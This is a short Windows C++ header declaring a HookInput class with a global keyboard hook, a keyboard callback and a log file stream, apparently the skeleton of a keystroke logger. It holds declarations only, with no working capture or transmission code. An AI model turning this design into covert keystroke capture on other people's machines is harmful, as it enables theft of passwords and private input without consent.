#pragma once
#include <Windows.h>
#include <fstream>

class HookInput
{
public:
	static void startTracking(void* pParam);
	static void stopTracking();
private:
	static HHOOK keyboardHook;
	static std::ofstream logFile;
	static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
};

